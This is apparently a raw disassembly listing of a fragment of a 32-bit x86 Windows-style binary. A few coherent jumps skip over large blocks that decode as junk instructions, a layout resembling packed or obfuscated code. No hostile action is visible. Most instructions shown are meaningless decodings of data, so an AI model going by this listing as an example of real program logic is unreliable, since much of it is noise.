  402065:	call   DWORD PTR ds:0x425020
  40206b:	cmp    DWORD PTR ds:0x42a2bd,0x14
  402072:	jb     0x402043
  402078:	sbb    DWORD PTR ds:0x42a311,edi
  40207e:	mov    DWORD PTR [ebp-0x4c],0xf89c85f8
  402085:	jmp    0x402590
  40208a:	int    0xc8
  40208c:	cmp    al,0xcb
  40208e:	rcr    ebx,0xd5
  402091:	(bad)  
  402093:	mov    ch,0x0
  402095:	mov    eax,0x29d39de7
  40209a:	inc    esi
  40209b:	or     bh,BYTE PTR [eax+0x78]
  40209e:	push   0x7c
  4020a0:	js     0x40211a
  4020a2:	xor    al,0xc5
  4020a4:	jg     0x40204e
  4020a6:	pop    es
  4020a7:	ficomp DWORD PTR [ebx+0x267e650d]
  4020ad:	push   0x75400c86
  4020b2:	xchg   ebp,eax
  4020b3:	stos   BYTE PTR es:[edi],al
  4020b4:	dec    esp
  4020b5:	fyl2x  
  4020b7:	jne    0x4020bf
  4020b9:	fnstcw WORD PTR [eax+ebp*8]
  4020bc:	cs jae 0x402091
  4020bf:	add    DWORD PTR [ebx-0x29],0x9
  4020c3:	add    edi,0x6ad0de2b
  4020c9:	push   DWORD PTR [ecx+eax*4-0x34]
  4020cd:	add    DWORD PTR [ebx+edx*2-0x30],edx
  4020d1:	push   ss
  4020d2:	mov    edx,DWORD PTR [ebx]
  4020d4:	sub    al,0xae
  4020d6:	frstor [edx+0x7]
  4020d9:	mov    bl,0x5c
  4020db:	in     eax,0xb
  4020dd:	jno    0x402060
  4020df:	scas   al,BYTE PTR es:[edi]
  4020e0:	psubd  mm7,QWORD PTR [eax+0x2e7b4bd]
  4020e7:	mov    ecx,edi
  4020e9:	mov    ch,dl
  4020eb:	(bad)  
  4020ed:	pop    esp
  4020ee:	add    eax,0xc7cd9ad6
  4020f3:	shr    BYTE PTR [edi+ebp*1+0x127c067a],0xcd
  4020fb:	lods   al,BYTE PTR ds:[esi]
  4020fc:	enter  0xbf0e,0x49
  402100:	loope  0x4020a5
  402102:	cwde   
  402103:	lock sbb esp,edi
  402106:	out    0x9b,eax
  402108:	mov    BYTE PTR [edi],ch
  40210a:	or     eax,0x1c8ba132
  40210f:	or     bl,dl
  402111:	mov    cl,0x93
  402113:	jno    0x402114
  402115:	sbb    esp,DWORD PTR [eax+0x27]
  402118:	pop    ebx
  402119:	ficom  WORD PTR [eax-0x1e7314c7]
  40211f:	outs   dx,BYTE PTR ds:[esi]
  402120:	ins    BYTE PTR es:[edi],dx
  402121:	cs out dx,al
  402123:	push   0xffffffca
  402125:	add    eax,0xee001492
  40212a:	stc    
  40212b:	sub    DWORD PTR [edi-0x13],ebp
  40212e:	push   ds
  40212f:	mov    edi,0xe36b91e9
  402134:	xchg   edi,eax
  402135:	ss int 0x70
  402138:	int    0x69
  40213a:	int    0x7e
  40213c:	js     0x40215a
  40213e:	mov    ah,0xc
  402140:	or     DWORD PTR [esi+0x10],eax
  402143:	pop    edx
  402144:	and    eax,0x4c3c7da0
  402149:	dec    ecx
  40214a:	aad    0xb3
  40214c:	xchg   edx,eax
  40214d:	dec    ebx
  40214e:	mov    ebx,0xd23a25ac
  402153:	imul   eax,DWORD PTR [esi],0x7e
  402156:	xor    BYTE PTR [ecx+eiz*4],cl
  402159:	es loope 0x4021c5
  40215c:	mov    ch,0xd2
  40215e:	lock inc ebx
  402160:	add    dh,ah
  402162:	adc    ecx,DWORD PTR [esi-0x32]
  402165:	jle    0x40215d
  402167:	aam    0xd6
  402169:	call   0x95080af2
  40216e:	sar    ebp,0xbb
  402171:	jle    0x40213b
  402173:	dec    eax
  402174:	rol    DWORD PTR [edx],cl
  402176:	xor    ecx,DWORD PTR [eax]
  402178:	sub    ecx,ecx
  40217a:	lahf   
  40217b:	ds mov al,0xbc
  40217e:	fnstenv [eax+0x2f54a5a8]
  402184:	dec    eax
  402185:	sti    
  402186:	push   es
  402187:	sub    eax,0x7ddbaeb2
  40218c:	(bad)  [ecx+0x12]
  40218f:	dec    edi
  402190:	in     al,dx
  402191:	(bad)  
  402192:	xchg   ebx,eax
  402193:	fs data16 jo 0x402179
  402197:	or     DWORD PTR [edx-0x55],esp
  40219a:	sbb    DWORD PTR ds:0x67eae3f3,esi
  4021a0:	or     DWORD PTR [esi],esp
  4021a2:	scas   eax,DWORD PTR es:[edi]
  4021a3:	rcl    DWORD PTR [ebp+0x57],1
  4021a6:	ins    DWORD PTR es:[edi],dx
  4021a7:	lods   eax,DWORD PTR ds:[esi]
  4021a8:	pop    ecx
  4021a9:	fldenv [ecx]
  4021ab:	retf   0xc521
  4021ae:	lea    esi,[esi-0x50]
  4021b1:	mul    edx
  4021b3:	dec    esp
  4021b4:	mov    bl,0x8d
  4021b6:	dec    edx
  4021b7:	mov    esp,0x7b62406e
  4021bc:	cmp    al,0x21
  4021be:	lea    esi,[eax]
  4021c0:	out    dx,al
  4021c1:	cmp    ch,BYTE PTR ds:0x69cf5478
  4021c7:	and    eax,0x56484635
  4021cc:	sbb    ebx,ebx
  4021ce:	cs fwait
  4021d0:	sbb    BYTE PTR [eax],dl
  4021d2:	stc    
  4021d3:	or     dh,bh
  4021d5:	and    cl,bl
  4021d7:	sub    cl,0x78
  4021da:	ins    DWORD PTR es:[edi],dx
  4021db:	xor    BYTE PTR [ecx+0x6fab5318],ch
  4021e1:	push   0xffffffe6
  4021e3:	or     ecx,DWORD PTR [ecx-0x58]
  4021e6:	mov    dl,0x11
  4021e8:	mov    bh,0x2f
  4021ea:	xchg   edi,eax
  4021eb:	lahf   
  4021ec:	je     0x4021f3
  4021ee:	inc    edi
  4021ef:	pop    edi
  4021f0:	imul   esp,DWORD PTR [eax],0x85259bb5
  4021f6:	xor    DWORD PTR [edi+ecx*1+0x17bf3bbb],ebx
  4021fd:	lods   al,BYTE PTR ds:[esi]
  4021fe:	adc    eax,esi
  402200:	enter  0xd05b,0xd9
  402204:	pop    ebp
  402205:	aam    0x1d
  402207:	and    al,0xfe
  402209:	jns    0x40226d
  40220b:	nop
  40220c:	cld    
  40220d:	in     al,0x8b
  40220f:	or     eax,0xbbf62660
  402214:	imul   ecx,edi,0x61200bac
  40221a:	dec    ecx
  40221b:	adc    eax,0x52cc2bd2
  402220:	dec    ecx
  402221:	inc    eax
  402222:	fstp   QWORD PTR [edx]
  402224:	retf   0xa7ca
  402227:	lea    esp,[ebp-0xcc10cf1]
  40222d:	jmp    0x83814096
  402232:	mov    WORD PTR [ecx+eax*4+0x28],fs
  402236:	cmp    ebx,ecx
  402238:	stc    
  402239:	hlt    
  40223a:	sub    BYTE PTR [edx-0x78],al
  40223d:	xchg   edx,eax
  40223e:	mov    ch,0xee
  402240:	xor    ebp,DWORD PTR [ebx-0x6f]
  402243:	mov    ah,0xaa
  402245:	adc    esp,edx
  402247:	sbb    eax,0xa5a902f7
  40224c:	in     eax,dx
  40224d:	jb     0x4022b8
  40224f:	push   0x99ed2e39
  402254:	mov    ds:0xee26c0db,al
  402259:	cmp    bh,BYTE PTR [eax+esi*8+0x40]
  40225d:	dec    esp
  40225e:	popa   
  40225f:	mov    dh,dl
  402261:	(bad)  
  402262:	cwde   
  402263:	sbb    al,0x1
  402265:	ds in  eax,dx
  402267:	push   cs
  402268:	and    edx,DWORD PTR [edi+0x67]
  40226b:	rcl    DWORD PTR [ebp+0x214e949f],1
  402271:	cmp    edi,eax
  402273:	cli    
  402274:	mov    eax,eax
  402276:	xchg   BYTE PTR [eax],ah
  402278:	mov    eax,ds:0xf6369983
  40227d:	adc    DWORD PTR [ecx-0x5c],0xddb154d
  402284:	(bad)  
  402285:	push   edx
  402286:	adc    esi,edx
  402288:	push   esi
  402289:	sub    eax,DWORD PTR [ebp-0x330a5965]
  40228f:	xchg   ebx,eax
  402290:	inc    esp
  402291:	jb     0x4022f5
  402293:	jp     0x402231
  402295:	ins    BYTE PTR es:[edi],dx
  402296:	test   DWORD PTR [ebp+edx*8-0x21b7ec0e],ebp
  40229d:	pop    ebp
  40229e:	sti    
  40229f:	dec    edx
  4022a0:	inc    esp
  4022a1:	push   0xbdd92960
  4022a6:	test   DWORD PTR [edx+0x1e8f46f4],0x890d00f
  4022b0:	jge    0x4022fe
  4022b2:	inc    edi
  4022b3:	jns    0x402242
  4022b5:	lods   al,BYTE PTR ds:[esi]
  4022b6:	sub    esp,0x33426510
  4022bc:	pushf  
  4022bd:	fld    DWORD PTR [ebx]
  4022bf:	or     dl,BYTE PTR [ebx+0x252fac80]
  4022c5:	dec    ebx
  4022c6:	fwait
  4022c7:	sbb    eax,ebx
  4022c9:	inc    ebx
  4022ca:	mov    eax,0x794b3b31
  4022cf:	mov    dl,0x3a
  4022d1:	sub    DWORD PTR [edi-0x79305110],ecx
  4022d7:	(bad)  
  4022d9:	push   eax
  4022da:	mov    bh,0x73
  4022dc:	cs mov dh,0xf4
  4022df:	dec    ebp
  4022e0:	stos   DWORD PTR es:[edi],eax
  4022e1:	or     DWORD PTR [ebp-0x1d],eax
  4022e4:	xor    esi,0x4e
  4022e7:	mov    edi,0x4e8b9a3e
  4022ec:	call   0xdb98a54
  4022f1:	mov    ah,cl
  4022f3:	and    esi,ebx
  4022f5:	xor    al,0xd8
  4022f7:	inc    eax
  4022f8:	out    0x6,al
  4022fa:	in     al,0x4b
  4022fc:	add    al,0xbe
  4022fe:	jg     0x4022a0
  402300:	js     0x40232a
  402302:	je     0x4022ce
  402304:	or     al,0x9
  402306:	sub    esp,ebx
  402308:	jmp    0x4022e1
  40230a:	mov    eax,ds:0xd8800c8f
  40230f:	ret    
  402310:	and    DWORD PTR [esi],0xffffffbf
  402313:	inc    eax
  402314:	inc    edi
  402315:	fwait
  402316:	xchg   esi,eax
  402317:	icebp  
  402318:	jmp    0x4022b7
  40231a:	cs sbb ch,bh
  40231d:	push   ss
  40231e:	in     eax,dx
  40231f:	ins    DWORD PTR es:[edi],dx
  402320:	pop    ds
  402321:	xor    al,0x5d
  402323:	pop    ds
  402324:	mov    esp,DWORD PTR [edx-0x17]
  402327:	ret    0x56d0
  40232a:	push   es
  40232b:	sub    al,0x21
  40232d:	xor    ah,BYTE PTR [esi+ecx*8]
  402330:	adc    al,0xe0
  402332:	cmc    
  402333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402334:	sbb    al,0x26
  402336:	sub    ah,bh
  402338:	xor    DWORD PTR [ebx],esi
  40233a:	ss leave 
  40233c:	adc    al,0xac
  40233e:	or     al,0x75
  402340:	push   edi
  402341:	add    DWORD PTR [ebx],edi
  402343:	cmp    DWORD PTR [eax+edx*2+0x7e096c8f],ebx
  40234a:	or     edx,DWORD PTR [edx+0x53]
  40234d:	xchg   esp,eax
  40234e:	add    bl,ch
  402350:	mov    dh,0xe3
  402352:	or     DWORD PTR [ebx],ecx
  402354:	mov    WORD PTR [ecx+0x45bd86b5],ss
  40235a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40235b:	or     bh,BYTE PTR ds:0x35daf9c9
  402361:	xchg   DWORD PTR [edx+0x2c],edx
  402364:	pop    esp
  402365:	pop    es
  402366:	lods   al,BYTE PTR ds:[esi]
  402367:	js     0x402387
  402369:	fcmovnb st,st(7)
  40236b:	sub    al,0x9b
  40236d:	out    dx,eax
  40236e:	jb     0x402349
  402370:	cmp    DWORD PTR [eax+0x1cad2917],esi
  402376:	push   ecx
  402377:	out    dx,al
  402378:	lea    esi,[edx+eiz*4+0x4472db89]
  40237f:	in     eax,0xcb
  402381:	push   0x4b
  402383:	rol    BYTE PTR [ebp+0x70],cl
  402386:	cmp    DWORD PTR [si-0x4b9c],ebx
  40238b:	call   0x5073:0xeabf8fb5
  402392:	sbb    eax,0x7db01c07
  402397:	and    DWORD PTR [edx+0x32],esi
  40239a:	(bad)  
  40239b:	sub    al,BYTE PTR [ecx+0x77]
  40239e:	jp     0x40235d
  4023a0:	mov    esp,0x195c36b6
  4023a5:	xchg   ebp,eax
  4023a6:	sti    
  4023a7:	pop    ecx
  4023a8:	jae    0x4023a5
  4023aa:	cmp    al,0x80
  4023ac:	push   edx
  4023ad:	pop    ebx
  4023ae:	mov    ch,0xee
  4023b0:	jl     0x4023ce
  4023b2:	int3   
  4023b3:	mov    al,0xac
  4023b5:	mov    fs,WORD PTR [ecx+0x57]
  4023b8:	lahf   
  4023b9:	mov    ds:0xe1d1b88d,al
  4023be:	imul   bh
  4023c0:	xchg   edx,eax
  4023c1:	into   
  4023c2:	shr    BYTE PTR [eax+0x7f0ce54b],cl
  4023c8:	mov    ds:0xcd08fda4,eax
  4023cd:	lock cdq 
  4023cf:	lods   al,BYTE PTR ds:[esi]
  4023d0:	inc    ebx
  4023d1:	shl    BYTE PTR [eax+0x3bd50016],0xeb
  4023d8:	dec    ebx
  4023d9:	repz std 
  4023db:	enter  0x7fcb,0x61
  4023df:	and    edx,DWORD PTR [ecx+0x3a1183c5]
  4023e5:	sti    
  4023e6:	scas   eax,DWORD PTR es:[edi]
  4023e7:	push   eax
  4023e8:	scas   eax,DWORD PTR es:[edi]
  4023e9:	and    DWORD PTR [eax],0x7be72b51
  4023ef:	push   ebp
  4023f0:	jg     0x402375
  4023f2:	gs or  eax,0xee06512b
  4023f9:	(bad)  
  4023fa:	dec    ebx
  4023fb:	rcr    BYTE PTR [edi-0x75ac7021],cl
  402401:	dec    ebx
  402402:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402404:	cld    
  402405:	addr16 add al,0xe2
  402408:	gs cmp eax,0xe02f3a8a
  40240e:	and    BYTE PTR [edx-0x33fe8d4d],cl
  402414:	dec    edi
  402415:	push   0x17b702d
  40241a:	ss data16 mov al,0x3e
  40241e:	aaa    
  40241f:	repz and cl,BYTE PTR [esi+0x7]
  402423:	mov    dh,0x6e
  402425:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402426:	mov    dl,0x18
  402428:	sub    al,dh
  40242a:	sub    edi,esp
  40242c:	jmp    0xaa5241f7
  402431:	mov    ecx,0x5df6bef9
  402436:	leave  
  402437:	js     0x40249e
  402439:	xchg   edx,eax
  40243a:	ficom  DWORD PTR [ebx]
  40243c:	int    0x2a
  40243e:	sbb    BYTE PTR [edi+0x3edf8b9c],0x6
  402445:	nop
  402446:	push   ecx
  402447:	push   ss
  402448:	cdq    
  402449:	popf   
  40244a:	add    ch,BYTE PTR [esp+ecx*2-0x19a99f1]
  402451:	out    dx,al
  402452:	imul   ecx,DWORD PTR [ebx+eiz*8],0x23d6fb6
  402459:	mov    esi,0x24ec1e46
  40245e:	jecxz  0x402462
  402460:	push   ds
  402461:	shl    BYTE PTR [ebx],cl
  402463:	cld    
  402464:	aaa    
  402465:	adc    dl,cl
  402467:	hlt    
  402468:	push   0x32
  40246a:	pop    ds
  40246b:	inc    ebx
  40246c:	mov    ah,0xbc
  40246e:	pop    esi
  40246f:	ror    BYTE PTR [ebx-0x5bac44df],0x11
  402476:	dec    ecx
  402477:	sub    cl,BYTE PTR [ebx+0x13cc1094]
  40247d:	imul   edi,DWORD PTR [ebx+ebp*8-0x2f],0x79
  402482:	dec    esp
  402483:	inc    esi
  402484:	arpl   WORD PTR [edi],di
  402486:	xor    bl,dh
  402488:	push   esi
  402489:	test   BYTE PTR [esi-0x79724809],dh
  40248f:	or     ch,BYTE PTR [ebx+edi*8+0x61e6cb7f]
  402496:	dec    ebp
  402497:	outs   dx,DWORD PTR ds:[esi]
  402498:	dec    ebp
  402499:	mov    dl,0xd0
  40249b:	inc    esi
  40249c:	cmp    dh,BYTE PTR [eax+ecx*2-0x1a]
  4024a0:	aas    
  4024a1:	ja     0x402472
  4024a3:	xchg   ecx,eax
  4024a4:	jecxz  0x4024a6
  4024a6:	(bad)  
  4024a7:	dec    ebp
  4024a8:	ret    
  4024a9:	dec    esp
  4024aa:	outs   dx,DWORD PTR ds:[esi]
  4024ab:	jle    0x4024b8
  4024ad:	dec    esi
  4024ae:	(bad)  
  4024af:	and    al,0x23
  4024b1:	in     eax,dx
  4024b2:	push   eax
  4024b3:	pop    ebx
  4024b4:	inc    ecx
  4024b5:	scas   al,BYTE PTR es:[edi]
  4024b6:	out    dx,eax
  4024b7:	call   0xefac:0x4a4858a7
  4024be:	add    eax,0x6a3d2d9d
  4024c3:	mov    gs,WORD PTR [edi+0x3257630a]
  4024c9:	push   edi
  4024ca:	idiv   BYTE PTR [ebx]
  4024cc:	or     al,0x74
  4024ce:	sub    cl,BYTE PTR [ebx+ebx*1]
  4024d1:	rol    DWORD PTR [edi+0x5e865d37],0xa7
  4024d8:	jns    0x40250a
  4024da:	cli    
  4024db:	nop
  4024dc:	jns    0x40247d
  4024de:	lahf   
  4024df:	sub    eax,0xc59eb913
  4024e4:	mov    ebx,0xc7a0b42e
  4024e9:	stos   DWORD PTR es:[edi],eax
  4024ea:	cdq    
  4024eb:	xor    ch,BYTE PTR [ecx+0x20]
  4024ee:	clc    
  4024ef:	cmc    
  4024f0:	test   BYTE PTR [ecx-0x4fe0d8e4],bl
  4024f6:	leave  
  4024f7:	(bad)  
  4024f8:	scas   al,BYTE PTR es:[edi]
  4024f9:	ficomp WORD PTR [esi+ebx*2-0x7a]
  4024fd:	xchg   esi,eax
  4024fe:	cs aaa 
  402500:	add    al,0xe7
  402502:	js     0x40251d
  402504:	inc    DWORD PTR [ecx+0x3a7cbee8]
  40250a:	dec    edx
  40250b:	nop
  40250c:	jnp    0x4024fd
  40250e:	or     edx,eax
  402510:	push   ecx
  402511:	push   ebx
  402512:	add    al,0x8a
  402514:	(bad)  
  402515:	or     BYTE PTR [esi+ecx*8],al
  402518:	std    
  402519:	inc    eax
  40251a:	dec    BYTE PTR [ecx+edi*1]
  40251d:	push   ds
  40251e:	sub    BYTE PTR [ebx],dh
  402520:	jno    0x40251d
  402522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402523:	data16 in al,0xb5
  402526:	lds    ecx,FWORD PTR [ebx+ecx*4+0x5960b6b1]
  40252d:	in     al,0x12
  40252f:	(bad)  
  402530:	pop    edi
  402531:	mov    ch,0x29
  402533:	test   bl,0x48
  402536:	int3   
  402537:	in     al,dx
  402538:	gs aas 
  40253a:	bound  ebp,QWORD PTR [eax-0x65e870d7]
  402540:	push   0x45bf4c37
  402545:	mov    edx,DWORD PTR [ecx+0x2c]
  402548:	mov    edx,0x7097bcd4
  40254d:	ror    BYTE PTR [ecx+0x32cbe46f],0xf0
  402554:	out    dx,eax
  402555:	adc    BYTE PTR [esp+ebp*8],ch
  402558:	retf   0xc0dd
  40255b:	pop    ss
  40255c:	outs   dx,DWORD PTR ds:[esi]
  40255d:	push   cs
  40255e:	pop    es
  40255f:	sbb    eax,DWORD PTR [edx-0x718f77bb]
  402565:	mov    ebp,0xdfeab355
  40256a:	jbe    0x4025bf
  40256c:	fldenv [edi+eax*8-0x68061a1c]
  402573:	cmpxchg DWORD PTR cs:[ebx-0x34],edi
  402578:	sub    DWORD PTR [ecx+0x127f473b],ebp
  40257e:	jns    0x40257e
  402580:	enter  0xb945,0x6a
  402584:	mov    dl,bl
  402586:	inc    eax
  402587:	aaa    
  402588:	mov    eax,0x8e8bc854
  40258d:	repz inc esp
  40258f:	in     eax,dx
  402590:	mov    DWORD PTR [ebp-0x3c],0xf89c85d8
  402597:	mov    eax,DWORD PTR [ebp-0x10]
  40259a:	and    ecx,DWORD PTR ds:0x42a31d
  4025a0:	jmp    0x402aab
  4025a5:	leave  
  4025a6:	mov    ebp,0xc93dc93f
  4025ac:	leave  
  4025ad:	jl     0x402558
  4025af:	lods   eax,DWORD PTR ds:[esi]
  4025b0:	aam    0xba
  4025b2:	ins    DWORD PTR es:[edi],dx
  4025b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025b4:	aaa    
  4025b5:	mov    al,0xd
  4025b7:	js     0x402631
  4025b9:	push   0x7c
  4025bb:	js     0x402635
  4025bd:	fwait
  4025be:	mov    bl,0x6b
  4025c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025c1:	dec    esp
  4025c2:	rcr    DWORD PTR [eax-0x2b],1
  4025c5:	mov    eax,0x9d4f0f32
  4025ca:	jp     0x4025a5
  4025cc:	test   DWORD PTR [ebp+0x60],eax
  4025cf:	ret    0x3fc1
  4025d2:	or     DWORD PTR [ebp-0x7e],esi
  4025d5:	leave  
  4025d6:	add    eax,0xe374b17f
  4025db:	sub    al,0x2e
  4025dd:	mov    dl,0x86
  4025df:	inc    esp
  4025e0:	mov    bl,0x45
  4025e2:	mov    al,ds:0xbbcd0570
  4025e7:	js     0x4025e6
  4025e9:	das    
  4025ea:	test   DWORD PTR [edi+0x47aa2f9f],0xcc76ec4
  4025f4:	fdivr  DWORD PTR [ebx-0x3a]
  4025f7:	bound  ebp,QWORD PTR [ecx+0x6a]
  4025fa:	inc    ebp
  4025fb:	fcom   DWORD PTR [esi-0x72]
  4025fe:	pop    esp
  4025ff:	ficomp WORD PTR [ebx+ebx*1]
  402602:	push   edi
  402603:	sub    al,0xae
  402605:	repz pop es
  402607:	sbb    al,0xd1
  402609:	repz push edx
  40260b:	int3   
  40260c:	(bad)  
  40260d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40260e:	lods   eax,DWORD PTR ds:[esi]
  40260f:	icebp  
  402610:	data16 aas 
  402612:	int3   
  402613:	mov    ds:0x54c6cf2c,eax
  402618:	dec    esi
  402619:	mov    bh,0xf9
  40261b:	outs   dx,DWORD PTR ds:[esi]
  40261c:	mov    esp,0x60fa858b
  402621:	sti    
  402622:	loopne 0x40261e
  402624:	jmp    0xdc13:0xe347f32c
  40262b:	mov    BYTE PTR [esi],bl
  40262d:	cmp    eax,0x8737eba0
  402632:	adc    al,0x4c
  402634:	inc    DWORD PTR [edx]
  402636:	fstp   TBYTE PTR [edx-0x22b2db80]
  40263c:	mov    edx,0x3fdaf15
  402641:	mov    bl,0xfe
  402643:	sub    DWORD PTR [edx+0x19],0x64
  402647:	repnz sbb DWORD PTR [edi-0x7a],esi
  40264b:	ret    
  40264c:	xor    eax,0x7cb4755f
  402651:	dec    ecx
  402652:	or     DWORD PTR [ecx-0xca69859],eax
  402658:	dec    edi
  402659:	scas   eax,DWORD PTR es:[edi]
  40265a:	cld    
  40265b:	idiv   bh
  40265d:	cwde   
  40265e:	retf   0x48fb
  402661:	dec    ecx
  402662:	mov    ?,WORD PTR [ebp+esi*2+0x7a7e5162]
  402669:	pop    ss
  40266a:	cli    
  40266b:	lea    eax,[eax]
  40266d:	pushf  
  40266e:	and    dl,BYTE PTR [edx-0x42]
  402671:	nop
  402672:	cdq    
  402673:	pop    ds
  402674:	stos   DWORD PTR es:[edi],eax
  402675:	xlat   BYTE PTR ds:[ebx]
  402676:	ss js  0x4026d9
  402679:	pop    ds
  40267a:	adc    DWORD PTR [ebx+0x5],eax
  40267d:	ror    BYTE PTR [edx+0x7ba1eaa6],cl
  402683:	pop    ss
  402684:	cmp    BYTE PTR [edx+0x781e84e4],ch
  40268a:	lods   al,BYTE PTR ds:[esi]
  40268b:	xor    eax,0x50573cb5
  402690:	and    edx,DWORD PTR [ecx-0x15015938]
  402696:	mov    al,0x45
  402698:	mov    edi,0x14240898
  40269d:	rcr    DWORD PTR [ebp+0x52],cl
  4026a0:	cmp    ah,ch
  4026a2:	push   ss
  4026a3:	sub    esi,esi
  4026a5:	lock mov ds:0x152cc86a,al
  4026ac:	jecxz  0x4026ef
  4026ae:	rcl    DWORD PTR [edi],0x6f
  4026b1:	iret   
  4026b2:	dec    esi
  4026b3:	dec    ebp
  4026b4:	mov    edi,0x9ef807cf
  4026b9:	inc    esp
  4026ba:	mov    edx,0xc1cf32d7
  4026bf:	imul   edx,DWORD PTR [ebx+0x4e],0xffffffee
  4026c3:	push   ecx
  4026c4:	inc    esp
  4026c5:	mov    dh,0x17
  4026c7:	pop    ds
  4026c8:	jnp    0x4026bb
  4026ca:	loope  0x402738
  4026cc:	mov    ah,0xec
  4026ce:	stos   DWORD PTR es:[edi],eax
  4026cf:	nop
  4026d0:	fstp   DWORD PTR [edi+eiz*4+0x481ca3b]
  4026d7:	inc    edi
  4026d8:	aam    0xd1
  4026da:	mov    bh,0x50
  4026dc:	and    ebp,esi
  4026de:	leave  
  4026df:	add    al,0x29
  4026e1:	scas   al,BYTE PTR es:[edi]
  4026e2:	dec    ebx
  4026e3:	mov    eax,0xaba7a28b
  4026e8:	adc    BYTE PTR [ebp-0x46],ch
  4026eb:	adc    DWORD PTR [ebp-0xe],edx
  4026ee:	shr    esp,0xa7
  4026f1:	jmp    edx
  4026f3:	iret   
  4026f4:	dec    eax
  4026f5:	jg     0x40274d
  4026f7:	shl    DWORD PTR [edx],1
  4026f9:	aam    0xcc
  4026fb:	rcl    DWORD PTR [ecx-0x2fc2caee],0x5f
  402702:	ror    DWORD PTR [edx-0x36],cl
  402705:	fdiv   st(5),st
  402707:	add    cl,0xf2
  40270a:	mov    eax,0x257658ff
  40270f:	shr    DWORD PTR [edx],0xcd
  402712:	dec    edx
  402713:	mov    edx,0xa618eeca
  402718:	inc    ebp
  402719:	data16 test al,dh
  40271c:	in     eax,dx
  40271d:	pop    es
  40271e:	mov    dh,0xcf
  402720:	cmc    
  402721:	clc    
  402722:	and    edx,DWORD PTR [eax]
  402724:	(bad)  
  402725:	std    
  402726:	push   esp
  402727:	sub    al,0xe4
  402729:	adc    ch,BYTE PTR ds:0xec1b4b09
  40272f:	jg     0x40270e
  402731:	into   
  402732:	xlat   BYTE PTR ds:[ebx]
  402733:	fwait
  402734:	dec    edx
  402735:	mov    edi,DWORD PTR [edi+0x1e]
  402738:	jp     0x4027a8
  40273a:	pop    ss
  40273b:	pop    ebx
  40273c:	cdq    
  40273d:	push   0x42e97e5e
  402742:	inc    esp
  402743:	retf   0x31ef
  402746:	aaa    
  402747:	scas   eax,DWORD PTR es:[edi]
  402748:	push   ecx
  402749:	cdq    
  40274a:	mov    eax,0x833df06f
  40274f:	pop    edi
  402750:	dec    eax
  402751:	outs   dx,DWORD PTR ds:[esi]
  402752:	mov    WORD PTR [ebx-0x7051884],?
  402758:	mov    ch,0xc6
  40275a:	lods   al,BYTE PTR ds:[esi]
  40275b:	in     al,0x57
  40275d:	mov    esp,0x4151eea0
  402762:	mov    eax,ds:0x8d2f03e7
  402767:	cmp    eax,0x1883c732
  40276c:	out    0xf,eax
  40276e:	jnp    0x402731
  402770:	cdq    
  402771:	inc    BYTE PTR [ecx+ebx*1+0x718debf]
  402778:	es jno 0x40273d
  40277b:	(bad)  
  40277c:	xor    esp,DWORD PTR [ecx+0x31]
  40277f:	jb     0x40276b
  402781:	rcl    DWORD PTR [ecx],1
  402783:	xlat   BYTE PTR ds:[ebx]
  402784:	jnp    0x40276c
  402786:	fstp   TBYTE PTR [ebx-0x62]
  402789:	xor    DWORD PTR [edx],edi
  40278b:	mov    ah,0xb
  40278d:	hlt    
  40278e:	loope  0x402786
  402790:	data16 xor BYTE PTR [ecx-0x47ee5e5a],cl
  402797:	adc    ecx,DWORD PTR [esi+edx*8-0x570605e8]
  40279e:	lea    ebx,[edi]
  4027a0:	scas   al,BYTE PTR es:[edi]
  4027a1:	iret   
  4027a2:	rol    DWORD PTR [ecx+0x5ffeba02],1
  4027a8:	fcom   QWORD PTR [eax-0x6e]
  4027ab:	sub    DWORD PTR [esi-0x63],0xfffffff4
  4027af:	inc    edx
  4027b0:	stos   BYTE PTR es:[edi],al
  4027b1:	dec    eax
  4027b2:	sbb    eax,0xd321caa1
  4027b7:	es in  eax,0x45
  4027ba:	mov    ch,0x6d
  4027bc:	fsub   QWORD PTR [eax-0x36ea859f]
  4027c2:	inc    esi
  4027c3:	pop    edx
  4027c4:	in     eax,dx
  4027c5:	sub    ecx,esp
  4027c7:	in     eax,dx
  4027c8:	mov    dh,0x59
  4027ca:	sub    BYTE PTR [edi-0x46],ch
  4027cd:	add    al,BYTE PTR [ebx-0x4fcd95bd]
  4027d3:	sub    eax,0xb8035681
  4027d8:	xchg   ebx,eax
  4027d9:	push   ecx
  4027da:	push   edx
  4027db:	out    dx,al
  4027dc:	inc    ebp
  4027dd:	xor    eax,0xfcc440ac
  4027e2:	(bad)  
  4027e3:	adc    cl,bl
  4027e5:	jle    0x402853
  4027e7:	ret    
  4027e8:	loopne 0x4027ea
  4027ea:	sub    al,0xc5
  4027ec:	and    esi,ebp
  4027ee:	daa    
  4027ef:	and    esp,ebp
  4027f1:	dec    edx
  4027f2:	and    DWORD PTR [ebp+esi*1+0x31b7da41],ebp
  4027f9:	cld    
  4027fa:	add    edi,eax
  4027fc:	into   
  4027fd:	cmp    BYTE PTR es:[ecx],cl
  402800:	and    al,0xd5
  402802:	mov    esp,0xf3e455e1
  402807:	test   edx,esi
  402809:	lahf   
  40280a:	dec    ebp
  40280b:	into   
  40280c:	add    ebx,DWORD PTR [ebx+0x5293daa0]
  402812:	adc    BYTE PTR fs:[edi-0xae21eee],al
  402819:	sbb    eax,0x5de515c8
  40281e:	or     edi,ecx
  402820:	lds    ecx,FWORD PTR ds:0xbd10bd58
  402826:	push   0xf57a5f63
  40282b:	(bad)  
  40282c:	and    BYTE PTR [edi+ebx*8],ch
  40282f:	lods   eax,DWORD PTR ds:[esi]
  402830:	add    ch,BYTE PTR [esi]
  402832:	test   al,0x75
  402834:	pop    eax
  402835:	shl    DWORD PTR [edi+0x72],0x75
  402839:	mov    esi,0x4d734751
  40283e:	push   es
  40283f:	mov    ecx,0xf0dc7385
  402844:	push   eax
  402845:	test   eax,0xc7a7939b
  40284a:	xchg   esp,eax
  40284b:	sbb    eax,0x39a07b20
  402850:	icebp  
  402851:	xor    ah,BYTE PTR [edi]
  402853:	and    BYTE PTR [esi],al
